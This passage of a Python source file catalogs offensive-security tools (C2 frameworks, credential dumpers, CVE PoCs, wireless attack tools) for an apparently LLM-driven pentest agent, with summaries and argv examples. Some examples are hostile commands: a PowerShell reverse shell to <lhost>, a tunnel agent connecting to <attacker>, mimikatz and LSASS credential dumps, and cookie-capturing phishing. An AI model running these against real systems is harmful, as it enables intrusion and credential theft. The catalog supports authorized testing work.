        "description."
    ),
    "ly4k/Certipy": (
        "Certipy — AD CS attack toolkit. See phase5 "
        "post_exploitation entry above for full "
        "description."
    ),
    "dirkjanm/mitm6": (
        "mitm6 — IPv6 DNS takeover. See phase5 "
        "post_exploitation entry above for full "
        "description."
    ),
    "dirkjanm/krbrelayx": (
        "krbrelayx — Kerberos delegation abuse. See "
        "phase5 post_exploitation entry above for full "
        "description."
    ),
    "Hackndo/lsassy": (
        "lsassy — LSASS credential extractor. See "
        "phase5 post_exploitation entry above for full "
        "description."
    ),
    "fortra/impacket": (
        "Impacket — canonical Windows / AD / Kerberos "
        "toolkit. See phase5 post_exploitation entry "
        "above for full description."
    ),
    "sqlmapproject/sqlmap": (
        "sqlmap — automatic SQL injection. See phase5 "
        "web entry above for full description."
    ),
    # --- c2 (phase3_more.txt) ---
    "Bingbingg/SharpHound3": (
        "SharpHound3 — modern fork of SharpHound. AD "
        "session / ACL / group ingestor. Read on "
        "operator's authorized AD scope."
    ),
    "SecureAuthCorp/impacket": (
        "Impacket (SecureAuthCorp mirror) — same as "
        "fortra/impacket. Canonical Windows / AD "
        "toolkit."
    ),
    "jpillora/chisel": (
        "chisel — fast TCP / UDP tunnel over HTTP, "
        "secured via SSH. Used for pivoting through "
        "firewalls / NAT in operator's authorized scope."
    ),
    "jpillora/dnstunnel": (
        "dnstunnel — TCP-over-DNS tunnel. Covert channel "
        "for restricted networks. Operator scope only."
    ),
    "trickest/dsieve": (
        "dsieve — filter domains from a list by "
        "criteria. Useful for subdomain scope expansion. "
        "Read-only."
    ),
    "lc/EntropyReduce": (
        "EntropyReduce — entropy-based string discovery "
        "in binary. Read-only; useful for finding keys / "
        "passwords in compiled code."
    ),
    "tomsteele/burp-entropy": (
        "burp-entropy — Burp extension for entropy-based "
        "secret discovery. Read-only."
    ),
    "RicterZ/genpAss": (
        "genpAss — strong password generator. Read-only."
    ),
    "dominic-breuker/stegoVeritas": (
        "stegoVeritas — bulk steganography detection. "
        "Images, zlib, LSB, etc. Read-only."
    ),
    "miguelpdl/WPA-PMKID-cracker": (
        "WPA-PMKID-cracker — PMKID hash capture + "
        "crack. Older reference; modern path is "
        "hcxtools + hashcat."
    ),
    "desty2k/KatanaFramework": (
        "KatanaFramework — Python recon / exploitation "
        "framework. Modules for OSINT, web, network. "
        "Active; operator scope only."
    ),
    # --- wifi (wireless_ble_ext.txt) ---
    "braktooth/braktooth": (
        "BrakTooth — Bluetooth Classic (BR/EDR) "
        "vulnerability research suite. CVE-2021-31609 "
        "and related. Lab use; never on unowned "
        "peripherals."
    ),
    "nicedayzhu/esp32-ble-sniffer": (
        "esp32-ble-sniffer — ESP32 BLE sniffer firmware. "
        "Companion to Wireshark. Read-only; operator's "
        "lab."
    ),
    "n0nexist/bt-sniffer": (
        "bt-sniffer — alternative Bluetooth sniffer "
        "tooling. Read-only; operator's lab."
    ),
    "Escapingbug/evilginx2": (
        "evilginx2 (Escapingbug fork) — maintained fork "
        "of kgretzky/evilginx2. Man-in-the-middle "
        "phishing proxy that captures session cookies. "
        "Operator-controlled domain only."
    ),
    "OJ/gobuster": (
        "gobuster — directory / file / DNS / vhost "
        "brute-forcer. See phase5 web entry above."
    ),
    "maurosoria/dirsearch": (
        "dirsearch — web path scanner. See phase5 web "
        "entry above."
    ),
    "ffuf/ffuf": (
        "ffuf — fast web fuzzer. See phase5 web entry "
        "above."
    ),
    "EnableSecurity/wafw00f": (
        "wafw00f — WAF fingerprint. See phase5 web "
        "entry above."
    ),
    # --- microsoft / phase3 AD/Windows ---
    "CravateRouge/bloodyAD": (
        "bloodyAD — Python AD privesc. See phase5 "
        "post_exploitation entry above."
    ),
    "login-securite/DonPAPI": (
        "DonPAPI — secret extractor. See phase5 "
        "post_exploitation entry above."
    ),
    "skelsec/msldap": (
        "msldap — async LDAP client. See phase5 "
        "post_exploitation entry above."
    ),
    "ropnop/kerbrute": (
        "kerbrute — Kerberos username enum, password "
        "spray, AS-REP roast, KRBEDU roast. AD "
        "password testing; operator scope only."
    ),
    "leechristensen/RandomPS": (
        "RandomPS — random PowerShell payload "
        "generator. Lab use; never on unowned hosts."
    ),
    "Viralmaniar/Pass-the-Hash": (
        "Pass-the-Hash — reference + Python tool for "
        "PtH over SMB / WMI. Lab use; operator scope."
    ),
    "EmpireCyber/SharpStrike": (
        "SharpStrike — C# command-and-control. .NET "
        "C2 framework alternative. Operator-controlled."
    ),
    # --- fresh_cves.txt / phase4 additional ---
    "Chocapikk/CVE-2022-30525": (
        "CVE-2022-30525 — Zyxel firewall unauth "
        "command injection. PoC for OS command "
        "injection in the management interface. "
        "Active; operator's authorized Zyxel only."
    ),
    "horizon3ai/CVE-2022-41040": (
        "CVE-2022-41040 — ProxyNotShell / Microsoft "
        "Exchange RCE. Read-only PoC; operator's "
        "authorized Exchange only."
    ),
    "fortra/CVE-2024-0204": (
        "CVE-2024-0204 — Fortra GoAnywhere MFT "
        "auth bypass. Active; operator's authorized "
        "MFT only."
    ),
    "xaitax/CVE-2023-23397": (
        "CVE-2023-23397 — Outlook NTLM credential "
        "leak. PoC for the Outlook EoP bug. "
        "Operator's authorized Outlook only."
    ),
    "CyberSecurityTeam/CVE-2024-3094": (
        "CVE-2024-3094 — XZ Utils backdoor (Jia "
        "Tan). Reference + scanner. Detection only; "
        "no exploitation."
    ),
    "horizon3ai/CVE-2023-23397": (
        "CVE-2023-23397 — alternative PoC. Outlook "
        "NTLM leak. Operator's authorized Outlook only."
    ),
    "veritas501/CVE-2019-9194": (
        "CVE-2019-9194 — PostgreSQL RCE via COPY "
        "FROM PROGRAM. Verified PoC. Active; "
        "operator's authorized PostgreSQL only."
    ),
    # --- Phase 6: top tools from 4 parallel subagent fan-out ---
    # C2 frameworks (15)
    "HavocFramework/Havoc": (
        "Havoc — modern cross-platform C2 framework with a Qt "
        "graphical client, Go teamserver, and a Windows Demon "
        "agent supporting Ekko/FOLIAGE sleep-obfuscation. "
        "Operator-targeted; for authorized scope only."
    ),
    "BC-SECURITY/Empire": (
        "Empire — PowerShell + Python post-exploitation C2 "
        "framework with the Starkiller Vue.js operator console. "
        "Starkiller is the modern front-end; Empire is the "
        "teamserver. For authorized scope only."
    ),
    "Ne0nd0g/merlin": (
        "Merlin — cross-platform HTTP/2 C2 with QUIC, peer-to-peer "
        "SMB/TCP/UDP transports and Mythic integration. Operates "
        "against operator's authorized scope only."
    ),
    "Adaptix-Framework/AdaptixC2": (
        "AdaptixC2 — modular C2 with C++ GUI client, Go teamserver, "
        "BOF / SMB / HTTP(S) / DNS transports. For authorized "
        "scope only."
    ),
    "cobbr/Covenant": (
        "Covenant — .NET collaborative C2 with multi-platform "
        "Grunts and Malleable C2-like profiles. For authorized "
        "scope only."
    ),
    "rasta-mouse/SharpC2": (
        "SharpC2 — .NET C2 with ASP.NET Core teamserver, .NET "
        "MAUI client and .NET Framework drone. For authorized "
        "scope only."
    ),
    "DragoQCC/CrucibleC2": (
        "CrucibleC2 — cross-platform C2 written in C# with "
        "extensible teamserver. For authorized scope only."
    ),
    "byt3bl33d3r/SilentTrinity": (
        "SilentTrinity — IronPython/.NET RAT with C2 server "
        "using IronPython for in-memory execution. For "
        "authorized scope only."
    ),
    "tnich/ligolo-ng": (
        "ligolo-ng — L3 TUN-based pivoting tool with TLS 1.3, "
        "QUIC, multi-listener and SOCKS5 relay. Useful in "
        "operator's authorized scope for tunnelling through "
        "compromised hosts."
    ),
    "jpillora/chisel": (
        "Chisel — fast TCP/UDP tunnel transported over HTTP, "
        "secured via SSH. Single static binary; useful in "
        "operator's authorized scope for tunnelling."
    ),
    "apache/caldera": (
        "CALDERA — automated adversary emulation platform built "
        "on MITRE ATT&CK (v5.x). Operator-curated; for authorized "
        "scope only."
    ),
    "redcanaryco/atomic-red-team": (
        "Atomic Red Team — library of ATT&CK-mapped tests for "
        "adversary emulation and detection validation. Used to "
        "validate detections in authorized scope."
    ),
    # Post-exploitation (8)
    "gentilkiwi/mimikatz": (
        "Mimikatz — Swiss-army knife Windows credential extraction "
        "(sekurlsa / kerberos / dpapi / lsadump). C, actively "
        "maintained by Benjamin DELPY. For authorized scope only."
    ),
    "GhostPack/Rubeus": (
        "Rubeus — C# toolset for raw Kerberos interaction: ticket "
        "extraction, kerberoasting, AS-REP roasting, S4U, "
        "golden / silver / diamond tickets. For authorized scope."
    ),
    "fortra/nanodump": (
        "nanodump — LSASS minidump swiss-army knife: process "
        "forking, snapshot, seclogon, PPL bypass, spoofed "
        "callstacks. Fortra 2024 updates. For authorized scope."
    ),
    "skelsec/pypykatz": (
        "pypykatz — pure-Python mimikatz: parses LSASS minidumps, "
        "registry hives, DPAPI; cross-platform library. For "
        "authorized scope."
    ),
    "AlessandroZ/LaZagne": (
        "LaZagne — cross-platform credential recovery: browsers, "
        "wifi, mail, sysadmin, KeePass, RDP, AWS, keychains. "
        "v2.4.7 (2025). For authorized scope only."
    ),
    "GhostPack/Seatbelt": (
        "Seatbelt — C# host-survey for offensive / defensive: "
        "AMSI, network, processes, scheduled tasks, AppLocker, "
        "ETW. 2025 updates. For authorized scope."
    ),
    "GhostPack/Certify": (
        "Certify — ADCS enumeration and ESC1-ESC11 abuse: "
        "enumerate vulnerable templates, request/forge certs. "
        "C#. For authorized scope only."
    ),
    "GhostPack/SharpUp": (
        "SharpUp — C# port of PowerUp: Windows privilege "
        "escalation checks (services, registry, dll hijacks, "
        "modifiable paths). For authorized scope."
    ),
    # Microsoft / AD (5)
    "Orange-Cyberdefense/AD-miner": (
        "AD-miner — AD audit on top of BloodHound data: web UI "
        "for misconfigurations, privilege escalation paths, "
        "compliance dashboards. Read-only on operator's scope."
    ),
    "sense-of-security/ADRecon": (
        "ADRecon — comprehensive AD data extraction to Excel: "
        "users, groups, computers, GPOs, trusts, ACLs, OUs, "
        "certificates, DNS. Read-only on operator's scope."
    ),
    "Pennyw0rth/NetExec": (
        "NetExec (nxc) — successor to CrackMapExec: SMB/LDAP/"
        "WinRM/MSSQL/RDP/SSH/FTP/WMI/NFS, modules for "
        "kerberoast / ASREProast / coerce / relay. For "
        "authorized scope only."
    ),
    "RhinoSecurityLabs/pacu": (
        "Pacu — AWS exploitation framework: enum / privesc / "
        "persistence / evasion for EC2 / Lambda / RDS / S3 / "
        "EKS / Glue / IAM / Cognito. For authorized scope."
    ),
    "BishopFox/cloudfox": (
        "cloudfox — AWS / Azure / GCP situational awareness: "
        "34+ AWS commands, finds exploitable attack paths, "
        "no alerts. For authorized scope."
    ),
    # OSINT (4)
    "kpcyrd/sn0int": (
        "sn0int — fast Rust OSINT framework with subdomain "
        "harvesting, PGP/breach discovery, and CT log "
        "scraping. Operator-targeted; passive reconnaissance."
    ),
    "alpkeskin/mosint": (
        "mosint — automated email OSINT tool aggregating "
        "Hunter, HIBP, IntelligenceX, EmailRep and more. "
        "Passive; operator-targeted."
    ),
    "p1ngul1n0/Blackbird": (
        "Blackbird — fast async username search across 500+ "
        "sites; single binary alternative to Sherlock. "
        "Passive; operator-targeted."
    ),
    "mxrch/GHunt": (
        "GHunt — Google account investigation tool extracting "
        "profile data via Google APIs. Passive; operator-targeted."
    ),
    # Recon (4)
    "projectdiscovery/cloudlist": (
        "cloudlist — multi-cloud asset enumeration across "
        "AWS / Azure / DigitalOcean / Cloudflare. Passive "
        "asset discovery; operator-targeted."
    ),
    "projectdiscovery/tlsx": (
        "tlsx — fast TLS handshaker with SAN/CN/JA3 "
        "fingerprinting for recon pivots. Read-only; "
        "operator-targeted."
    ),
    "d3mondev/puredns": (
        "puredns — fast domain resolver and subdomain "
        "bruteforcer using massdns. Read-only; "
        "operator-targeted."
    ),
    "prowler-cloud/prowler": (
        "prowler — multi-cloud (AWS/Azure/GCP/K8s) security "
        "posture assessment, very actively maintained. "
        "For authorized scope only."
    ),
    # Exploit / LPE (4)
    "liamg/traitor": (
        "traitor — Linux auto-privesc: GTFOBins sudo / file "
        "escapes + DirtyPipe (CVE-2022-0847) + PwnKit "
        "(CVE-2021-4034) + CVE-2021-3560. Go static binary."
    ),
    "Notselwyn/CVE-2024-1086": (
        "CVE-2024-1086 — Linux nftables UAF LPE, kernels "
        "5.14-6.6, 99.4% success on KernelCTF; arbitrary "
        "kernel r/w. For authorized scope only."
    ),
    "Jevil36239/lpe-toolkit": (
        "lpe-toolkit — multi-arch Linux LPE toolkit: 20 "
        "exploits incl. CVE-2024-1086, CVE-2023-0386, "
        "CVE-2022-0847, CVE-2021-4034; auto-detect+run."
    ),
    "SunWeb3Sec/CVE-2023-0386": (
        "CVE-2023-0386 — Linux kernel OverlayFS local "
        "privilege escalation. For authorized scope only."
    ),
    # WiFi (4)
    "justcallmekoko/ESP32Marauder": (
        "ESP32Marauder — ESP32 WiFi/BLE multi-tool: deauth, "
        "beacon spam, probe capture, wardrive. Actively "
        "maintained 2024."
    ),
    "spacehuhn/esp8266_deauther": (
        "Spacehuhn Deauther 2.0 — ESP8266/ESP32 WiFi scan / "
        "deauth / attack firmware. For authorized scope only."
    ),
    "vanhoefm/fragattacks": (
        "FRAGATTACKS — research scripts and PoC for 802.11 "
        "frame fragmentation / aggregation attacks. For "
        "authorized scope only."
    ),
    "vanhoefm/krackattacks": (
        "KRACK (Key Reinstallation) — research scripts and "
        "PCAPs for the original 2017 attack. For "
        "authorized scope only."
    ),
    # BLE (3)
    "nccgroup/Sniffle": (
        "Sniffle — NCCGroup nRF52840 BLE 5 sniffer with "
        "Wireshark ext-cap plugin. Read-only; "
        "operator-targeted."
    ),
    "NordicSemiconductor/nrf-sniffer-for-ble": (
        "Nordic nRF Sniffer — official BLE sniffer firmware + "
        "Wireshark plugin (Windows/macOS/Linux). Read-only; "
        "operator-targeted."
    ),
    "nccgroup/phantap": (
        "PhanTap — HCI MITM proxy that intercepts BLE traffic "
        "between phone and peripheral. For authorized scope only."
    ),
    # Web (3)
    "PortSwigger/param-miner": (
        "Param Miner — PortSwigger Burp extension for hidden "
        "parameter discovery. Operator-targeted."
    ),
    "PortSwigger/turbo-intruder": (
        "Turbo Intruder — PortSwigger high-speed HTTP fuzzer "
        "extension for Burp. Operator-targeted."
    ),
    "PortSwigger/HttpRequestSmuggler": (
        "HTTP Request Smuggler — PortSwigger desync-detection "
        "extension for Burp. Operator-targeted."
    ),
    # Android (2)
    "ReversecLabs/drozer": (
        "Drozer — ReversecLabs-maintained Android pentest "
        "framework (3.1.0, Aug 2024). Operator-targeted."
    ),
    "sensepost/objection": (
        "Objection — runtime mobile exploration toolkit built "
        "on Frida. For authorized scope only."
    ),
    # iOS (2)
    "ios-sec/needle": (
        "Needle — OWASP iOS pentest framework (still maintained "
        "for iOS 15+). For authorized scope only."
    ),
    "nowsecure/frida-scripts": (
        "nowsecure/frida-scripts — curated Frida hooks for "
        "iOS/Android pentest. Operator-targeted."
    ),
}


# Per-category default descriptions — used when a repo is not in
# the curated _REPO_SUMMARIES map. The operator's Phase 5
# requirement: "catalog/ contents must be described as much as
# possible" — even uncurated entries get a structured description
# derived from the category.
_CATEGORY_DEFAULTS: Dict[str, str] = {
    "exploit": (
        "CVE PoC or exploit-framework entry from the operator's "
        "curated fetch list. INVOKE ONLY against targets in the "
        "operator's authorized scope. Per-step ACCEPT/CANCEL "
        "gate is in effect. The chain planner must provide a "
        "rationale naming the CVE id and the target."
    ),
    "post_exploitation": (
        "Post-exploitation toolkit (Linux / Windows / macOS). "
        "Privesc enum, credential extraction, lateral movement, "
        "persistence. INVOKE ONLY on hosts the operator has "
        "gained access to within the authorized scope."
    ),
    "osint": (
        "OSINT / open-source intelligence tool. Passive recon "
        "on public sources (search engines, breach data, "
        "social, certificate transparency). No target contact."
    ),
    "recon": (
        "Recon / scanning / discovery tool. Active probing of "
        "operator's authorized scope only. Per-step "
        "ACCEPT/CANCEL gate is in effect."
    ),
    "web": (
        "Web application security tool (scanner, fuzzer, "
        "exploitation). Active against operator's authorized "
        "web targets only. Per-step ACCEPT/CANCEL gate is in "
        "effect."
    ),
    "c2": (
        "Command and control / RAT / framework. Operator-"
        "controlled listener only. INVOKE ONLY against targets "
        "in the operator's authorized scope."
    ),
    "wifi": (
        "WiFi / wireless attack tool. Active only on the "
        "operator's authorized wireless scope. Per-step "
        "ACCEPT/CANCEL gate is in effect. NEVER on unowned "
        "spectrum."
    ),
    "ble": (
        "Bluetooth / BLE attack tool. Active only on the "
        "operator's authorized peripherals. Per-step "
        "ACCEPT/CANCEL gate is in effect. NEVER on unowned "
        "peripherals."
    ),
    "android": (
        "Android security / pentest tool. Lab use only; never "
        "on unowned devices."
    ),
    "ios": (
        "iOS security / pentest tool. Lab use only; never on "
        "unowned devices."
    ),
    "microsoft": (
        "Active Directory / Windows / Microsoft tool. Per-step "
        "ACCEPT/CANCEL gate is in effect; operator's "
        "authorized scope only."
    ),
    "frameworks": (
        "Offensive security framework from the operator's "
        "curated fetch list. Per-step ACCEPT/CANCEL gate is in "
        "effect. INVOKE ONLY against targets in the operator's "
        "authorized scope."
    ),
    "offensive": (
        "Offensive security tool from the operator's curated "
        "fetch list. Per-step ACCEPT/CANCEL gate is in effect. "
        "INVOKE ONLY against targets in the operator's "
        "authorized scope."
    ),
    "wireless_ble_ext": (
        "Wireless / BLE extension from the operator's curated "
        "fetch list. Per-step ACCEPT/CANCEL gate is in effect. "
        "Operator's authorized scope only."
    ),
}


def _default_summary_for(category: str, owner: str, name: str) -> str:
    """Return a category-derived default summary for a repo
    that has no curated entry in :data:`_REPO_SUMMARIES`."""
    base = _CATEGORY_DEFAULTS.get(
        category,
        "Toolbox from the operator's curated fetch list. "
        "Per-step ACCEPT/CANCEL gate is in effect.",
    )
    return (
        f"**{owner}/{name}** — {base} See "
        f"https://github.com/{owner}/{name} for the upstream "
        f"README, license, and releases."
    )


def _summary_for(owner: str, name: str, category: str) -> str:
    """Return the curated or default summary for a repo."""
    return _REPO_SUMMARIES.get(
        f"{owner}/{name}", _default_summary_for(category, owner, name)
    )


def _derive_tag(owner: str, name: str) -> str:
    """Derive a short tag from a repo's owner/name. Used as a
    fallback in the ``tags`` list so the catalog entries are
    searchable by an LLM looking for, e.g., "pupy" or
    "bloodhound"."""
    return name.lower().replace("-", "").replace("_", "").replace(".", "")


# Per-repo curated ``use_cases`` and ``command_examples``. The
# operator's Phase 5+ requirement: "catalog/ contents must be
# described as much as possible" — every catalog entry should
# tell the LLM WHEN to use the tool and HOW to invoke it. The
# shape is::
#
#   {
#     "<owner>/<name>": {
#       "use_cases": [...],          # when the LLM should pick this tool
#       "command_examples": [...],   # argv examples for the run_toolbox step
#     }
#   }
#
# When a repo is not in the map, the entry gets category-derived
# generic use_cases and a placeholder command_examples line. The
# LLM prompt stanza can reference these directly.
_REPO_DETAILS: Dict[str, Dict[str, Any]] = {
    "threat9/routersploit": {
        "use_cases": [
            "default-credential scan of an exposed router / IoT",
            "exploit auth-bypass / RCE on a router in scope",
            "fingerprint a router and pick the right exploit module",
        ],
        "command_examples": [
            "python rsf.py --target <ip>",
            "python rsf.py -t <ip> -m exploits/<vendor>/<exploit>",
        ],
    },
    "BishopFox/sliver": {
        "use_cases": [
            "deploy cross-platform implant in scope",
            "operate a C2 listener behind the per-step ACCEPT gate",
            "execute BOF / in-memory tasks on a foothold",
        ],
        "command_examples": [
            "sliver-server",
            "sliver-client > generate --mtls <lhost>:<lport>",
        ],
    },
    "its-a-feature/Mythic": {
        "use_cases": [
            "multi-agent C2 with custom profiles",
            "Dockerized C2 server for lab / operator-controlled scope",
        ],
        "command_examples": [
            "./mythic-cli install",
            "./mythic-cli start",
        ],
    },
    "byt3bl33d3r/CrackMapExec": {
        "use_cases": [
            "AD password spray via SMB / WinRM / LDAP / MSSQL / SSH / RDP",
            "credential dump + lateral movement pivot",
        ],
        "command_examples": [
            "crackmapexec smb <subnet> -u <user> -p <pass> --shares",
            "crackmapexec smb <subnet> -u <user> -H <hash> --exec-method smbexec -x <cmd>",
        ],
    },
    "kgretzky/evilginx2": {
        "use_cases": [
            "phishing with session-cookie capture (bypasses 2FA)",
            "OAuth / SAML token capture for later replay",
        ],
        "command_examples": [
            "evilginx2 -p ./phishlets -t <template> -d <domain>",
        ],
    },
    "fortra/impacket": {
        "use_cases": [
            "remote exec via psexec / wmiexec / smbexec / atexec",
            "credential dump via secretsdump",
            "Kerberos ticket abuse (GetUserSPNs, ticketer, GetNPUsers)",
            "NTLM relay via ntlmrelayx",
        ],
        "command_examples": [
            "impacket-psexec <user>:<pass>@<ip>",
            "impacket-secretsdump <user>:<pass>@<ip>",
            "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc>",
        ],
    },
    "PowerShellMafia/PowerSploit": {
        "use_cases": [
            "AD recon via PowerView",
            "privesc via PowerUp",
            "DLL injection / code exec via Invoke-*",
        ],
        "command_examples": [
            "powershell -ep bypass -c \"Import-Module .\\PowerSploit.psm1\"",
        ],
    },
    "samratashok/nishang": {
        "use_cases": [
            "PowerShell reverse shell on a Windows foothold",
            "credential exfil via Out-WebRequest / Copy-VSS",
        ],
        "command_examples": [
            "powershell -ep bypass -c \"Import-Module .\\nishang\\Shells\\Invoke-PowerShellTcp.ps1; Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>\"",
        ],
    },
    "BloodHoundAD/BloodHound": {
        "use_cases": [
            "visualize AD attack paths",
            "find shortest path to Domain Admins",
        ],
        "command_examples": [
            "neo4j start",
            "bloodhound --no-sandbox",
        ],
    },
    "cobbr/SharpHound": {
        "use_cases": [
            "ingest AD sessions / ACLs into BloodHound",
        ],
        "command_examples": [
            "SharpHound.exe -c All",
        ],
    },
    "fox-it/BloodHound.py": {
        "use_cases": [
            "Python ingestor (no PowerShell needed)",
        ],
        "command_examples": [
            "bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc>",
        ],
    },
    "login-securite/DonPAPI": {
        "use_cases": [
            "extract DPAPI / browser / KeePass / WinSCP / VNC / mstsc secrets",
        ],
        "command_examples": [
            "donPAPI <domain>/<user>:<pass>@<ip>",
        ],
    },
    "ly4k/Certipy": {
        "use_cases": [
            "AD CS ESC1-ESC11 enumeration + exploitation",
            "NTLM relay via AD CS",
        ],
        "command_examples": [
            "certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable",
            "certipy req -u <user>@<domain> -p <pass> -ca <ca> -template <tpl>",
        ],
    },
    "dirkjanm/mitm6": {
        "use_cases": [
            "IPv6 DNS takeover in AD",
            "WPAD interception for credential capture",
        ],
        "command_examples": [
            "mitm6 -i <iface> -d <domain>",
        ],
    },
    "Hackndo/lsassy": {
        "use_cases": [
            "remote LSASS credential dump",
        ],
        "command_examples": [
            "lsassy -u <user> -p <pass> -d <domain> <ip>",
        ],
    },
    "sqlmapproject/sqlmap": {
        "use_cases": [
            "detect + exploit SQL injection in HTTP params / cookies / headers",
            "OS shell via SQLi",
        ],
        "command_examples": [
            "sqlmap -u \"http://<target>/?<param>=1\" --dbs",
            "sqlmap -r req.txt --os-shell",
        ],
    },
    "projectdiscovery/nuclei": {
        "use_cases": [
            "template-based vuln scan across thousands of CVEs",
            "default-credential probing",
            "exposed-panel / misconfig fingerprint",
        ],
        "command_examples": [
            "nuclei -u <target> -t cves/ -t exposed-panels/",
            "nuclei -l targets.txt -severity high,critical",
        ],
    },
    "projectdiscovery/subfinder": {
        "use_cases": [
            "passive subdomain enumeration from 50+ sources",
        ],
        "command_examples": [
            "subfinder -d <domain> -all",
        ],
    },
    "projectdiscovery/httpx": {
        "use_cases": [
            "fast HTTP probe (status, title, tech) across many hosts",
        ],
        "command_examples": [
            "httpx -l hosts.txt -title -tech-detect -status-code",
        ],
    },
    "projectdiscovery/naabu": {
        "use_cases": [
            "fast port scan (sync / async)",
        ],
        "command_examples": [
            "naabu -host <target> -p -",
        ],
    },
    "ffuf/ffuf": {
        "use_cases": [
            "directory / file / vhost / parameter fuzzing",
        ],
        "command_examples": [
            "ffuf -u http://<target>/FUZZ -w wordlist.txt",
            "ffuf -u http://<target>/ -H \"Host: FUZZ\" -w vhosts.txt",
        ],
    },
    "OJ/gobuster": {
        "use_cases": [
            "directory / DNS / vhost brute-forcer",
        ],
        "command_examples": [
            "gobuster dir -u http://<target> -w wordlist.txt",
        ],
    },
    "smicallef/spiderfoot": {
        "use_cases": [
            "automated OSINT across 200+ modules",
            "correlate domain / IP / email / breach data",
        ],
        "command_examples": [
            "spiderfoot -l <ip>:5001",
        ],
    },
    "laramies/theHarvester": {
        "use_cases": [
            "harvest emails / subdomains / hosts from public sources",
        ],
        "command_examples": [
            "theHarvester -d <domain> -b all",
        ],
    },
    "FluxionNetwork/fluxion": {
        "use_cases": [
            "WPA/WPA2 evil-twin attack with captive portal",
        ],
        "command_examples": [
            "sudo ./fluxion.sh",
        ],
    },
    "derv82/wifite2": {
        "use_cases": [
            "automated wireless audit (WEP / WPA / WPS)",
        ],
        "command_examples": [
            "sudo wifite -i <iface> --kill",
        ],
    },
    "v1s1t0r1sh3r3/airgeddon": {
        "use_cases": [
            "multi-use wireless auditor",
        ],
        "command_examples": [
            "sudo airgeddon",
        ],
    },
    "ZerBea/hcxdumptool": {
        "use_cases": [
            "capture PMKID / EAPOL / RADIUS",
        ],
        "command_examples": [
            "sudo hcxdumptool -i <iface> -o capture.pcapng --enable_status=1",
        ],
    },
    "P0cL4bs/WiFi-Pumpkin": {
        "use_cases": [
            "rogue AP with MITM proxy",
        ],
        "command_examples": [
            "sudo wifi-pumpkin",
        ],
    },
    "evilsocket/bettercap": {
        "use_cases": [
            "MITM / network attack / monitoring framework",
        ],
        "command_examples": [
            "sudo bettercap -iface <iface>",
        ],
    },
    "carlospolop/PEASS-ng": {
        "use_cases": [
            "post-foothold Linux / Windows privesc enum",
        ],
        "command_examples": [
            "./linpeas.sh",
            "winPEASx64.exe",
        ],
    },
    "rebootuser/LinEnum": {
        "use_cases": [
            "Linux host enum bash script",
        ],
        "command_examples": [
            "./LinEnum.sh",
        ],
    },
    "n1nj4sec/pupy": {
        "use_cases": [
            "Python RAT / C2 cross-platform implant",
        ],
        "command_examples": [
            "python pupysh",
        ],
    },
    "quasar/QuasarRAT": {
        "use_cases": [
            "Windows .NET C2",
        ],
        "command_examples": [
            "Quasar.exe",
        ],
    },
    "securing/gattacker": {
        "use_cases": [
            "BLE GATT MITM proxy",
        ],
        "command_examples": [
            "node gattacker.js",
        ],
    },
    "virtualabs/btlejack": {
        "use_cases": [
            "BLE hijack / GATT injection",
        ],
        "command_examples": [
            "btlejack -i <hci>",
        ],
    },
    "MobSF/Mobile-Security-Framework-MobSF": {
        "use_cases": [
            "automated static + dynamic analysis of mobile apps",
        ],
        "command_examples": [
            "./run.sh",
        ],
    },
    "frida/frida": {
        "use_cases": [
            "dynamic instrumentation toolkit (mobile + desktop)",
        ],
        "command_examples": [
            "frida -U -f <bundle> -l script.js --no-pause",
        ],
    },
    # --- Phase 6: top tools from 4 parallel subagent fan-out ---
    "gentilkiwi/mimikatz": {
        "use_cases": [
            "extract plaintext credentials, hashes, and Kerberos tickets from a Windows host",
            "pass-the-hash / pass-the-ticket on an authorized target",
            "DCSync to dump KRBTGT and replicate AD secrets",
        ],
        "command_examples": [
            "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
            "mimikatz.exe lsadump::dcsync /user:krbtgt",
        ],
    },
    "GhostPack/Rubeus": {
        "use_cases": [
            "kerberoast / AS-REP roast service accounts",
            "S4U2Self + S4U2Proxy constrained-delegation abuse",
            "ticket extraction from the current logon session",
        ],
        "command_examples": [
            "Rubeus.exe kerberoast /outfile:hashes.txt",
            "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt",
        ],
    },
    "fortra/nanodump": {
        "use_cases": [
            "stealthy LSASS dump on a PPL-protected Windows process",
            "snapshot-based dump without touching disk",
            "seclogon-based dump avoiding common AV/EDR hooks",
        ],
        "command_examples": [
            "nanodump.exe -w C:\\Windows\\Temp\\lsass.dmp",
        ],
    },
    "AlessandroZ/LaZagne": {
        "use_cases": [
            "recover browser / wifi / mail / RDP / AWS credentials on a Windows host",
            "post-exfil credential sweeping for lateral movement",
            "extract KeePass / Sysadmin / keychain secrets",
        ],
        "command_examples": [
            "laZagne.exe all",
            "laZagne browsers",
        ],
    },
    "HavocFramework/Havoc": {
        "use_cases": [
            "deploy a Demon agent on an authorized Windows host",
            "BOF execution with sleep obfuscation",
            "operator-dashboard for the Havoc teamserver",
        ],
        "command_examples": [
            "./havoc client",
            "./havoc server --profile ./profiles/default.yaml",
        ],
    },
    "tnich/ligolo-ng": {
        "use_cases": [
            "TUN-based pivoting through a compromised Linux/Windows host",
            "SOCKS5 relay via the agent",
            "multi-listener + QUIC transport for hard-to-reach segments",
        ],
        "command_examples": [
            "ligolo-ng proxy -selfcert",
            "ligolo-ng agent -connect <attacker>:11601 -ignore-cert",
        ],
    },
    "jpillora/chisel": {
        "use_cases": [
            "TCP/UDP tunnel over HTTP(S) through a compromised host",
            "SSH-secured reverse tunnel for out-of-band access",
            "single-binary static deployment",
        ],
        "command_examples": [
            "chisel server -p 8000 --reverse",
            "chisel client <server>:8000 R:socks",
        ],
    },
    "Pennyw0rth/NetExec": {
        "use_cases": [
            "SMB / LDAP / WinRM / MSSQL / RDP / SSH authentication testing",
            "kerberoast / ASREProast modules over SMB",
            "coerce / relay module chaining for AD",
        ],
        "command_examples": [
            "nxc smb <targets> -u <user> -p <pass> --shares",
            "nxc ldap <dc> -u <user> -p <pass> --kerberoasting output.txt",
        ],
    },
    "RhinoSecurityLabs/pacu": {
        "use_cases": [
            "AWS enumeration of EC2 / Lambda / IAM / S3 / RDS / EKS",
            "AWS privilege escalation via misconfigured trust policies",
            "persistence + evasion modules in operator's authorized AWS scope",
        ],
        "command_examples": [
            "pacu --help",
            "pacu> run iam__enum_permissions",
        ],
